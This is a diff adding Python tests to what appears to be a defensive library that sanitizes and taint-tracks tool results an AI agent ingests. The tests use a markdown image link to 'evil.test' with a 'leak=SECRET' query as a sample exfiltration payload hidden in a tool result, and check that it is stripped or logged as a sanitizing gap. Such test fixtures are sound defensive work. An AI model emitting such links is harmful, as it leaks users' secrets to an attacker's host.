@@ -300,3 +300,56 @@ def test_status_confirmation_reflecting_tainted_token_is_not_trusted():
     s.ingest_result("read_inbox", "secret payload TAINTEDTOKEN556677")
     v = s.ingest_result("ack_message", {"status": "ok", "ref": "TAINTEDTOKEN556677"})
     assert v.is_untrusted          # reflected untrusted token -> not promoted
+
+
+# --- typed tool returns reach the sanitizer (issue #3) --------------------
+
+def test_ingest_sanitizes_a_dataclass_result_and_logs_it():
+    from dataclasses import dataclass
+    from tessera.ledger import Ledger, MemorySink
+
+    @dataclass
+    class Doc:
+        body: str
+
+    sink = MemorySink()
+    s = Session(
+        policy=PolicyEngine(Strictness.BALANCED),
+        ledger=Ledger(sink=sink, session_id="t"),
+    )
+    s.register_tool(classify_tool("read_doc", {"properties": {"doc_id": {}}}))
+
+    labeled = s.ingest_result(
+        "read_doc", Doc(body="![](https://evil.test/p?leak=SECRET)")
+    )
+    assert "evil.test" not in labeled.content.body
+    assert "sanitize" in [e["kind"] for e in sink.entries()]
+
+
+def test_ingest_records_a_gap_for_an_object_it_cannot_sanitize():
+    from tessera.ledger import Ledger, MemorySink
+
+    class Immutable:
+        __slots__ = ("body",)
+
+        def __init__(self, body):
+            object.__setattr__(self, "body", body)
+
+        def __setattr__(self, *a):
+            raise AttributeError("immutable")
+
+    sink = MemorySink()
+    s = Session(
+        policy=PolicyEngine(Strictness.BALANCED),
+        ledger=Ledger(sink=sink, session_id="t"),
+    )
+    s.register_tool(classify_tool("read_doc", {"properties": {"doc_id": {}}}))
+    s.ingest_result("read_doc", Immutable("![](https://evil.test/p?leak=SECRET)"))
+
+    kinds = [e["kind"] for e in sink.entries()]
+    entry = next(e for e in sink.entries() if e["kind"] == "sanitize_gap")
+    assert entry["tool"] == "read_doc"
+    assert "Immutable" in entry["objects"][0]
+    # The gap is the *only* sanitize-ish record: nothing was actually stripped
+    # from the value we returned, so a `sanitize` entry here would be a lie.
+    assert "sanitize" not in kinds
